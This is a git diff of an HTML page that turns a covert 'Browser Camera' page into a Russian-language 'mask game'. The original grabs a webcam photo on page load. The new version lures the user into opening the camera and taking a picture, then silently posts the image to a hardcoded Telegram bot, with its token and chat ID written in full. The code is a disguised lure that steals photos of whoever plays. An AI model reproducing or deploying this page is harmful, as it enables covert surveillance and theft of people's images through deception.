@@ -3,70 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Browser Camera</title>
+    <title>Game with Camera</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        #videoContainer {
+            display: none;
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        video {
+            width: 100%;
+            border-radius: 10px;
+            background: #000;
+        }
+        #gameMessage {
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+        #startButton, #captureButton {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        #startButton:hover, #captureButton:hover {
+            background-color: #45a049;
+        }
+        #captureButton {
+            display: none;
+        }
+        #maskEffect {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2em;
+            color: white;
+            font-weight: bold;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Taking a photo...</h1>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <h1>Добро пожаловать в игру с маской!</h1>
+    <div id="gameMessage">
+        <p>Включите камеру, чтобы увидеть свою маску!</p>
+        <p>Когда будете готовы, нажмите "Начать" для захвата изображения.</p>
+    </div>
+
+    <button id="startButton" onclick="startCamera()">Начать</button>
+
+    <div id="videoContainer">
+        <video id="video" autoplay playsinline></video>
+        <div id="maskEffect">Внимание, захват изображения!</div>
+        <button id="captureButton" onclick="capturePhoto()">Сделать фото</button>
+    </div>
+
+    <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
         const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
         const CHAT_ID = '1753361154';
 
-        // Функция для работы с камерой
-        const startCameraAndCapturePhoto = () => {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        const videoContainer = document.getElementById('videoContainer');
+        const startButton = document.getElementById('startButton');
+        const captureButton = document.getElementById('captureButton');
+        const maskEffect = document.getElementById('maskEffect');
 
-            // Доступ к камере
+        // Функция для запроса доступа к камере
+        function startCamera() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
+                .then((stream) => {
+                    // Показываем видео с камеры и скрываем кнопку старта
                     video.srcObject = stream;
+                    videoContainer.style.display = 'block';
+                    startButton.style.display = 'none';
+                    captureButton.style.display = 'inline-block';
 
-                    // Захват фото после активации камеры
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            const context = canvas.getContext('2d');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            const imageData = canvas.toDataURL('image/jpeg');
-
-                            // Конвертация base64 в файл и отправка в Telegram
-                            fetch(imageData)
-                                .then(res => res.blob())
-                                .then(blob => {
-                                    const formData = new FormData();
-                                    formData.append('chat_id', CHAT_ID);
-                                    formData.append('photo', blob, 'photo.jpg');
-
-                                    // Отправка фото в Telegram
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    })
-                                    .then(response => response.json())
-                                    .then(data => {
-                                        if (data.ok) {
-                                            console.log("Photo sent successfully!");
-                                        } else {
-                                            console.error("Failed to send photo:", data.description);
-                                        }
-                                    })
-                                    .catch(err => console.error("Error sending photo:", err));
-                                });
-                        }, 1000); // 1 секунда для активации камеры
-                    };
+                    // Имитация эффекта маски
+                    setTimeout(() => {
+                        maskEffect.innerText = "Сделайте фото!";
+                    }, 2000); // Через 2 секунды меняем текст
                 })
-                .catch(err => {
-                    console.error("Camera access error:", err);
-                    document.body.innerHTML = "<h1>Camera access denied. Please allow camera permissions.</h1>";
+                .catch((err) => {
+                    console.error('Ошибка доступа к камере:', err);
+                    alert('Не удалось получить доступ к камере. Убедитесь, что камера подключена и разрешения предоставлены.');
                 });
-        };
+        }
 
-        // Запуск камеры и захват фото при загрузке страницы
-        window.onload = startCameraAndCapturePhoto;
+        // Функция для захвата фото
+        function capturePhoto() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Устанавливаем размеры холста равными видео
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Рисуем изображение с видео на холст
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Получаем изображение в формате base64
+            const imageData = canvas.toDataURL('image/jpeg');
+            console.log('Фото захвачено:', imageData); // Здесь можно отправить фото куда нужно
+
+            // Конвертация base64 в файл и отправка в Telegram
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+
+                    // Отправка фото в Telegram
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("Фото отправлено успешно!");
+                        } else {
+                            console.error("Ошибка отправки фото:", data.description);
+                        }
+                    })
+                    .catch(err => console.error("Ошибка при отправке фото:", err));
+                });
+
+            // Остановить поток видео
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+
+            // Скрыть видео и показать сообщение
+            videoContainer.style.display = 'none';
+            document.body.innerHTML += "<p>Фото успешно отправлено!</p>";
+        }
     </script>
 </body>
 </html>
